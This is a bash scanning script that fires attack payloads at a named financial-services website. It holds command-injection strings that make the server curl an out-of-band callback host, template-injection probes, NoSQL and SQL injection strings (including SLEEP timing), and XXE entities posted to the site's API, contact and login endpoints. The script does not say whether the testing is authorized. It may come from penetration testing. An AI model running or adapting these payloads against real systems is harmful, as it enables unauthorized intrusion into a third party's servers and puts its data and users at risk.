#!/bin/bash
# CMDi / SSTI / NoSQLi / XXE payload firing against every discovered parameter,
# each embedding a unique OOB callback host for zero-FP confirmation.
B="https://www.infinitycapital.bh"
O="dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
fire() { # $1=label $2=url
  code=$(curl -sk -m 15 -o /tmp/f.html -w "%{http_code}" "$2")
  body=$(wc -c < /tmp/f.html)
  printf "%-34s %s size=%s\n" "$1" "$code" "$body"
}

echo "### CMDi on _next/image?url"
fire "url-semicolon"  "$B/_next/image?url=%3Bcurl%20http%3A%2F%2Foobb9fb402d0448.$O%2Fp1&w=640&q=75"
fire "url-backsubs"   "$B/_next/image?url=%24%28curl%20http%3A%2F%2Foobb9fb402d0448.$O%2Fp2%29&w=640&q=75"
fire "url-backtick"   "$B/_next/image?url=%60curl%20http%3A%2F%2Foobb9fb402d0448.$O%2Fp3%60&w=640&q=75"
fire "url-pipe"       "$B/_next/image?url=abc%7Ccurl%20http%3A%2F%2Foobb9fb402d0448.$O%2Fp4&w=640&q=75"
fire "url-nnpipe"     "$B/_next/image?url=abc%7C%7Ccurl%20http%3A%2F%2Foobb9fb402d0448.$O%2Fp5&w=640&q=75"
fire "url-nlpipe"     "$B/_next/image?url=abc%0acurl%20http%3A%2F%2Foobb9fb402d0448.$O%2Fp6&w=640&q=75"

echo "### CMDi on w"
fire "w-semicolon"    "$B/_next/image?url=abc&w=640%3Bcurl%20http%3A%2F%2Foob19cd2b5383a8.$O%2Fw1&q=75"
fire "w-backsubs"     "$B/_next/image?url=abc&w=%24%28curl%20http%3A%2F%2Foob19cd2b5383a8.$O%2Fw2%29&q=75"
fire "w-backtick"     "$B/_next/image?url=abc&w=%60curl%20http%3A%2F%2Foob19cd2b5383a8.$O%2Fw3%60&q=75"

echo "### CMDi on q"
fire "q-semicolon"    "$B/_next/image?url=abc&w=640&q=75%3Bcurl%20http%3A%2F%2Foob4d7ba0affff7.$O%2Fq1"
fire "q-backsubs"     "$B/_next/image?url=abc&w=640&q=%24%28curl%20http%3A%2F%2Foob4d7ba0affff7.$O%2Fq2%29"
fire "q-backtick"     "$B/_next/image?url=abc&w=640&q=%60curl%20http%3A%2F%2Foob4d7ba0affff7.$O%2Fq3%60"

echo "### SSTI"
fire "url-ssti7"      "$B/_next/image?url=%7B%7B7*7%7D%7D&w=640&q=75"
fire "url-ssti2"      "$B/_next/image?url=%24%7B7*7%7D&w=640&q=75"
fire "q-ssti7"        "$B/_next/image?url=abc&w=640&q=%7B%7B7*7%7D%7D"
fire "404-ssti"       "$B/%7B%7B7*7%7D%7D"
fire "api-ssti"       "$B/api/?q=%7B%7B7*7%7D%7D"

echo "### NoSQLi"
fire "404-nosq-ne"    "$B/?username%5B%24ne%5D=1"
fire "404-nosq-re"    "$B/?q%5B%24regex%5D=.*"
fire "api-nosq"       "$B/api/?q%5B%24ne%5D=1"
fire "img-nosq"       "$B/_next/image?url%5B%24ne%5D=1&w=640&q=75"
fire "img-nosq2"      "$B/_next/image?w=640&q=%7B%22%24ne%22%3A%7B%22%24gt%22%3A%22%22%7D%7D"
fire "dollarp-sqli"   "$B/?q=1%27%20or%201%3D1--"
fire "dollarp-sqli2"  "$B/?q=1%20UNION%20SELECT%20NULL,NULL--"
fire "dollarp-sqli3"  "$B/?id=1%27%20AND%20SLEEP(5)--"

echo "### XXE on POST bodies"
curl -sk -m 15 -o /dev/null -w "xxe-api %{http_code}\n" -X POST "$B/api/" \
  -H "Content-Type: application/xml" \
  --data-binary '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://oob571a47f26f8c.'"$O"'/xxe">]><r>&x;</r>'
curl -sk -m 15 -o /dev/null -w "xxe-contact %{http_code}\n" -X POST "$B/contact" \
  -H "Content-Type: text/xml" \
  --data-binary '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://oob17aecfd7c311.'"$O"'/xxe2">]><r>&x;</r>'
curl -sk -m 15 -o /dev/null -w "xxe-login %{http_code}\n" -X POST "$B/login" \
  -H "Content-Type: application/xml" \
  --data-binary '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://oob2d43988f0966.'"$O"'/xxe3">]><r>&x;</r>'
